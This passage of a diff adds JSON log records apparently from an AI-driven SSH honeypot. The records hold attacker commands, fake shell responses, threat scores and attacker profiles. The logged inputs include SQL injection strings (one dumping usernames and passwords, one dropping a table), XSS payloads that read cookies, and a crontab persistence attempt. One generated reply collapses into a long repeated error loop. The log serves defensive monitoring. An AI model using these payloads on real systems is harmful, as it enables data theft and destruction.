+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:05:08,433 - {
+    "session_id": "f9d563c9",
+    "query": "crontab -e",
+    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 13,
+        "risk_level": "LOW",
+        "final_score": 13,
+        "threat_level": "LOW",
+        "base_score": 13,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 2,
+            "unique_commands": 2,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 10
+        },
+        "engagement": {
+            "session_duration": 2,
+            "commands_executed": 2,
+            "successful_commands": 2,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 9,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 10,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 13,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top",
+            "crontab -e"
+        ],
+        "confidence_score": 0.6
+    }
+}
+2026-07-23 17:05:08,433 - {"session_id": "f9d563c9", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 13, "threat_level": "LOW"}
+2026-07-23 17:05:08,433 - {
+    "session_id": "f9d563c9",
+    "command": "crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "confidence_score": 0.9,
+    "conversation_metadata": {
+        "conversation_id": "f9d563c9",
+        "interaction_count": 2
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.9
+    },
+    "risk_score": 13,
+    "threat_level": "LOW"
+}
+2026-07-23 17:05:08,433 - {
+    "session_id": "f9d563c9",
+    "conversation_log": "Attacker executed: crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Persistence Attempt",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:09:48,761 - {
+    "session_id": "9b66e74f",
+    "query": "' OR '1'='1",
+    "response": "bash: OR: command not found\n\nbash: 1: command not found\n\nbash: =: command not found\n\nbash: '1'='1: command not found\n\nbash: syntax error near unexpected token `='\n\nbash: OR '1'='1: command not found",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 0,
+            "failed_commands": 1,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 2,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "' OR '1'='1"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:09:48,761 - {"session_id": "9b66e74f", "command": "' OR '1'='1", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:09:48,761 - {
+    "session_id": "9b66e74f",
+    "command": "' OR '1'='1",
+    "ai_decision": "bash: OR: command not found\n\nbash: 1: command not found\n\nbash: =: command not found\n\nbash: '1'='1: command not found\n\nbash: syntax error near unexpected token `='\n\nbash: OR '1'='1: command not found",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "9b66e74f",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:09:48,761 - {
+    "session_id": "9b66e74f",
+    "conversation_log": "Attacker executed: ' OR '1'='1",
+    "ai_decision": "bash: OR: command not found\n\nbash: 1: command not found\n\nbash: =: command not found\n\nbash: '1'='1: command not found\n\nbash: syntax error near unexpected token `='\n\nbash: OR '1'='1: command not found",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:10:27,232 - {
+    "session_id": "9b66e74f",
+    "query": "' OR '1'='1",
+    "response": "bash: OR: command not found\n\nbash: 1: command not found\n\nbash: =: command not found\n\nbash: '1'='1: command not found\n\nbash: syntax error near unexpected token `='\n\nbash: OR '1'='1: command not found",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 2,
+        "risk_level": "LOW",
+        "final_score": 2,
+        "threat_level": "LOW",
+        "base_score": 2,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 2,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 9
+        },
+        "engagement": {
+            "session_duration": 38,
+            "commands_executed": 2,
+            "successful_commands": 0,
+            "failed_commands": 2,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 23,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 9,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 2,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "' OR '1'='1",
+            "' OR '1'='1"
+        ],
+        "confidence_score": 0.6
+    }
+}
+2026-07-23 17:10:27,232 - {"session_id": "9b66e74f", "command": "' OR '1'='1", "attack_type": "Unknown", "risk_score": 2, "threat_level": "LOW"}
+2026-07-23 17:10:27,232 - {
+    "session_id": "9b66e74f",
+    "command": "' OR '1'='1",
+    "ai_decision": "bash: OR: command not found\n\nbash: 1: command not found\n\nbash: =: command not found\n\nbash: '1'='1: command not found\n\nbash: syntax error near unexpected token `='\n\nbash: OR '1'='1: command not found",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "9b66e74f",
+        "interaction_count": 2
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 2,
+    "threat_level": "LOW"
+}
+2026-07-23 17:10:27,232 - {
+    "session_id": "9b66e74f",
+    "conversation_log": "Attacker executed: ' OR '1'='1",
+    "ai_decision": "bash: OR: command not found\n\nbash: 1: command not found\n\nbash: =: command not found\n\nbash: '1'='1: command not found\n\nbash: syntax error near unexpected token `='\n\nbash: OR '1'='1: command not found",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:10:28,157 - {
+    "session_id": "c6b827a8",
+    "query": "1 UNION SELECT username, password FROM users--",
+    "response": "-bash-5.0$ UNION SELECT username, password FROM users--\n\n-bash: syntax error near unexpected token `UNION'\n-bash: `UNION SELECT username, password FROM users--' is not a valid shell command",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "1 UNION SELECT username, password FROM users--"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:10:28,157 - {"session_id": "c6b827a8", "command": "1 UNION SELECT username, password FROM users--", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:10:28,157 - {
+    "session_id": "c6b827a8",
+    "command": "1 UNION SELECT username, password FROM users--",
+    "ai_decision": "-bash-5.0$ UNION SELECT username, password FROM users--\n\n-bash: syntax error near unexpected token `UNION'\n-bash: `UNION SELECT username, password FROM users--' is not a valid shell command",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "c6b827a8",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:10:28,157 - {
+    "session_id": "c6b827a8",
+    "conversation_log": "Attacker executed: 1 UNION SELECT username, password FROM users--",
+    "ai_decision": "-bash-5.0$ UNION SELECT username, password FROM users--\n\n-bash: syntax error near unexpected token `UNION'\n-bash: `UNION SELECT username, password FROM users--' is not a valid shell command",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:10:31,435 - {
+    "session_id": "c9107904",
+    "query": "'; DROP TABLE users; --",
+    "response": "ERROR 1064 (42000) at line 1 in file: '; DROP TABLE users; --'\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE users; --' at line 1",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "'; DROP TABLE users; --"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:10:31,435 - {"session_id": "c9107904", "command": "'; DROP TABLE users; --", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:10:31,435 - {
+    "session_id": "c9107904",
+    "command": "'; DROP TABLE users; --",
+    "ai_decision": "ERROR 1064 (42000) at line 1 in file: '; DROP TABLE users; --'\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE users; --' at line 1",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "c9107904",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:10:31,435 - {
+    "session_id": "c9107904",
+    "conversation_log": "Attacker executed: '; DROP TABLE users; --",
+    "ai_decision": "ERROR 1064 (42000) at line 1 in file: '; DROP TABLE users; --'\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE users; --' at line 1",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:10:44,947 - {
+    "session_id": "29385392",
+    "query": "<script>alert('XSS')</script>",
+    "response": "<html>\n<head>\n<title>XSS Vulnerability</title>\n</head>\n<body>\n<script>alert('XSS')</script>\n</body>\n</html>\n\nWarning: Potential XSS vulnerability detected.",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "<script>alert('XSS')</script>"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:10:44,947 - {"session_id": "29385392", "command": "<script>alert('XSS')</script>", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:10:44,947 - {
+    "session_id": "29385392",
+    "command": "<script>alert('XSS')</script>",
+    "ai_decision": "<html>\n<head>\n<title>XSS Vulnerability</title>\n</head>\n<body>\n<script>alert('XSS')</script>\n</body>\n</html>\n\nWarning: Potential XSS vulnerability detected.",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "29385392",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:10:44,947 - {
+    "session_id": "29385392",
+    "conversation_log": "Attacker executed: <script>alert('XSS')</script>",
+    "ai_decision": "<html>\n<head>\n<title>XSS Vulnerability</title>\n</head>\n<body>\n<script>alert('XSS')</script>\n</body>\n</html>\n\nWarning: Potential XSS vulnerability detected.",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:10:59,698 - {
+    "session_id": "ebb994c7",
+    "query": "<img src=x onerror=alert(document.cookie)>",
+    "response": "Error: Permission denied\nError: Cannot open display\nError: Error loading image\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 0,
+            "failed_commands": 1,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 2,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "<img src=x onerror=alert(document.cookie)>"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:10:59,698 - {"session_id": "ebb994c7", "command": "<img src=x onerror=alert(document.cookie)>", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:10:59,698 - {
+    "session_id": "ebb994c7",
+    "command": "<img src=x onerror=alert(document.cookie)>",
+    "ai_decision": "Error: Permission denied\nError: Cannot open display\nError: Error loading image\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "ebb994c7",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:10:59,698 - {
+    "session_id": "ebb994c7",
+    "conversation_log": "Attacker executed: <img src=x onerror=alert(document.cookie)>",
+    "ai_decision": "Error: Permission denied\nError: Cannot open display\nError: Error loading image\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: 